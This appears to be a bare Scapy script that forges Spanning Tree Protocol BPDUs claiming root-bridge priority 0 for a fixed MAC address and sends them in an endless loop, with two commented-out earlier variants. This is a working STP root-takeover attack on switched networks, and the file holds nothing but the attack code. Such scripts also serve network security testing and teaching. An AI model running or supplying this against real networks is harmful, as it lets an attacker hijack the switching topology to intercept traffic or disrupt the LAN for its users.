from scapy.all import *
#C=Ether(dst='00:03:0f:83:66:a3')/STP(bridgeid='8192 / 0 / 98:E7:F4:51:68:77',rootid='8192 / 0 / 98:E7:F4:51:68:77')
#C=Ether(dst="01:80:c2:00:00:00",src="98:E7:F4:51:68:77")/LLC(dsap=0x42,ssap=0x42,ctrl=0x03)/STP(rootid=0,rootmac="98:E7:F4:51:68:77",bridgeid=0,bridgemac="98:E7:F4:51:68:77")
C=Ether(dst="01:80:c2:00:00:00")/LLC(dsap=0x42,ssap=0x42,ctrl=0x03)/STP(rootid=0,rootmac="98:E7:F4:51:68:77",bridgeid=0,bridgemac="98:E7:F4:51:68:77")
sendp(C,inter=2,loop=1)